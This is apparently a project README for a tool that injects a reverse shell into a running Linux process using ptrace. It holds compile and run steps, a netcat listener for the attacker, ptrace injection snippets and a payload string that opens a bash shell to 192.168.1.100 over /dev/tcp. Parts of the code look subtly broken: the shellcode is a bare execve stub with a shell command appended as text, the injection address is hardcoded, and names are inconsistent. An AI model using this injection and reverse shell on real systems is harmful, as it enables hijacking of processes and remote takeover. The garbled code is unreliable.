# Reverse Shell Injection using Ptrace

This project demonstrates how to inject a reverse shell payload into a running process using the `ptrace` system call in Linux. The injected shell connects back to an attacker's machine, allowing remote control.

## **Features**

- Attaches to a running process using `ptrace`.
- Injects a reverse shell payload into the process's memory.
- Establishes a connection to an attacker's IP and port.
- Detaches from the target process after injection.

## **Prerequisites**

- Linux system with GCC installed.
- Root privileges (for process attachment).
- Knowledge of the target process ID (PID).

## **Usage**

### **Step 1: Compile the Code**

```bash
gcc -o inject_reverse_shell inject_reverse_shell.c -Wall
```

### **Step 2: Run the Binary**

```bash
sudo ./inject_reverse_shell
```

### **Step 3: Set Up Listener on Attacker Machine**

On the attacker's system, set up a Netcat listener to catch the reverse shell:

```bash
nc -lvp 4444
```

## **Code Explanation**

### **1. Attach to Target Process:**

```c
ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
waitpid(target_pid, NULL, 0);
```

- This attaches to the process specified by `TARGET_PID` and waits until it's ready for manipulation.

### **2. Inject Reverse Shell:**

```c
for (size_t i = 0; i < size; i += sizeof(long)) {
    memcpy(&ret, shellcode + i, sizeof(long));
    ptrace(PTRACE_POKETEXT, pid, (void *)(0x7f60133ba000 + i), (void *)ret);
}
```

- Injects the reverse shell payload into the memory of the target process.

### **3. Detach from Process:**

```c
ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
```

- Detaches from the process, allowing it to continue normal execution.

## **Shellcode Details**

```c
char reverse_shell[] =
    "\x48\x31\xc0\x50\x5f\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1";
```

- This payload opens a reverse shell to IP `192.168.1.100` on port `4444`.

## **Legal Disclaimer**

This project is intended for educational and authorized testing purposes only. Unauthorized use of this code against systems you do not own is illegal and unethical.

## **Contributing**

Feel free to submit issues and pull requests for improvements.

## **License**

This project is licensed under the MIT License.

